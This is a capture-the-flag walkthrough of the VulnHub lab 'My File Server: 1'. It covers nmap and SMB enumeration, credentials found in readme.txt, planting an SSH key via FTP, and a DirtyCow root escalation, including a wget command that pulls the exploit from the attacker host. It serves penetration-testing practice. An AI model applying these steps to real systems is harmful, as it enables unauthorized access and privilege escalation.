<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">My File Server- 1: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/my-file-server-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-08T18:30:05+00:00">March 8, 2020</time><time class="updated" datetime="2025-06-10T20:10:41+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Another walkthrough for the vulnhub machine “My File Server: 1” which is an easy lab designed by the author to give a taste to the OSCP Labs. The challenge is simple just like any other CTF challenge where you identify the flag with the help of your pentest skill.</span></p>
<p><span style="color: #000000;">Download it from here: <a style="color: #000000;" href="https://www.vulnhub.com/entry/my-file-server-1,432/">https://www.vulnhub.com/entry/my-file-server-1,432/</a></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Network Scan</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdicover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">SMBMAP</span></li>
<li><span style="color: #000000;">Nikto</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit</strong></span></p>
<ul>
<li><span style="color: #000000;">Injecting id_rsa.pub via FTP</span></li>
<li><span style="color: #000000;">Spwan PTY shell</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Kernel Exploit</span></li>
<li><span style="color: #000000;">Capture the Flag.</span></li>
</ul>
<p><span style="color: #000000;"><u>Walkthrough</u></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">So, as we always start with netdiscover to get the IP of the VM machine and the IP of the host I’ve found is 192.168.29.123.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Dn4re3jDA7A/XmU3ozc7GzI/AAAAAAAAi8Q/wUbbIRsyCtsyopGiIyDn66fbiXHV4YvkgCLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Let’s proceed with network scan using Nmap aggressive scan as given below.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.29.123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AUrVJAU-KL0/XmU3qLXo8YI/AAAAAAAAi8c/ox1ZyazvrIgVxiIOPz2IPan1d0LbUpqwQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Hmmm! It was very interesting as I noticed that there were so many services running on the host network that was a good sign to us. We saw FTP’s “anonymous login enabled” and port 445 was also available for SMB.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GOcCNpIROSQ/XmU3qefNh2I/AAAAAAAAi8g/lo5WC5UNpEc2K-hEwv_3SFqLO6KKZD1yQCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">So, I ran the following command for SMB enumeration and identify a username as “smbuser”.</span></p>
<pre class="lang:default decode:true">smbmap -H 192.168.29.123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CuLgRvGMWtU/XmU3rYH39MI/AAAAAAAAi8k/I3_0K647SO0joKq6Mb5mRpoxSiYIxUOMQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We also explore the IP host in the web browser as port 80 has been opened for the HTTP service.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-XM44iSh8vDI/XmU3rnq-LnI/AAAAAAAAi8o/7nooMihMorIu0IVudzRdnELSUa3GyJQ6wCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We’re also trying to list web directories via directory brute force attack, but that didn’t give any performance so I chose to run nikto for HTTP weak config listing, and luckily found an entry for “readme.txt,” let’s test this in the web browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-u3twVNnLzmo/XmU3r1aUMSI/AAAAAAAAi8s/N1588uRIz7cFZWw88YbTsKpfaHzdNfy1QCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Yeah! I think the author has kept this file as a clue that he wants to get the password by searching the readme.txt file.</span></p>
<p><span style="color: #000000;">So now I had the username “smbuser” and the password “rootroot1” and it was time to connect to the host machine via ssh, so I tried to use this cred for ssh login, but we got an error as connection timeout, which means that the username “smbuser” cannot connect to the host machine via ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iDIkaoSb4mI/XmU3sm8oFsI/AAAAAAAAi8w/V1-iNuMxuxcV8PjPTWn2FFfFwVQRNhDlgCLcBGAsYHQ/s1600/7.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitaion</strong></span></h3>
<p><span style="color: #000000;">Now time to generate some ssh keys, thus we used ssh-keygen to generate ssh public keys without password in our local machine i.e. KALI LINUX. Moving on after the key is created, we moved into the .ssh directory on our native shell, here we saw that we have the key named “id_rsa.pub”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FXxrqngDhsE/XmU3tFJSrkI/AAAAAAAAi84/AZl9_FfMduwQVkX6Y50crbX3SXs5DVFqwCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">With the help of above-enumerated creds “smbuser:rootroot1” we logged into FTP and create a folder as .ssh inside /home/smbuser, then try to upload the id_rsa.pub which we have generated in above mention step as authorized_keys  inside the .ssh directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-R3qsnPIj_s0/XmU3tA8SlSI/AAAAAAAAi80/gg4EculkBnY5YSN4G8R-Abd_BlXmwojBwCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Then I again tried to connect with SSH without using a password and finally obtain the shell of the host machine and enumerated the OS kernel version.</span></p>
<p><span style="color: #000000;">So, I found it’s a really old version of the kernel that’s built here, so I’m trying to check for a piece of code to exploit, and luckily, I find it to be a DIRTYCOW exploit. So, I download a hack from <a style="color: #000000;" href="https://www.exploit-db.com/exploits/40616">Exploit-DB</a> written in c.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hODbTdmuV94/XmU3pFTzzyI/AAAAAAAAi8U/T5uP2x4x3CEbcvy1g7PoH6_dh2iTGLu9gCLcBGAsYHQ/s1600/10.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
<p><span style="color: #000000;">I downloaded the exploit inside the host machine, and then compiled it before running the exploit, so I ran the following commands.</span></p>
<pre class="lang:default decode:true">wget http://192.168.29.208:8000/40616.c
gcc 40616.c -o raj -pthread
./raj</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fWJVZzPaccQ/XmU3pN7jIXI/AAAAAAAAi8M/j1l7K7kyEo8jZI48tNhQ2XFMWh8ANklfQCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Boom! We the got root the shell by running ./raj and finally, we obtain proof.txt file.</span></p>
<p><span style="color: #000000;">cat proof.txt</span></p>
<p><span style="color: #000000;"><strong>Conclusion:</strong> This was a really simple CTF machine for beginners, if you’re planning for OSCP then you should start practising this kind of challenge.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VyYXXjGrdok/XmU3qMuK1uI/AAAAAAAAi8Y/2nVPpGwcQUM8-5hoUhqvxz4nJ_4ZUiaRwCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Shubham Sharma is a Pentester, Cybersecurity Researcher and Enthusiast, contact <strong><a style="color: #000000;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">here</a></strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
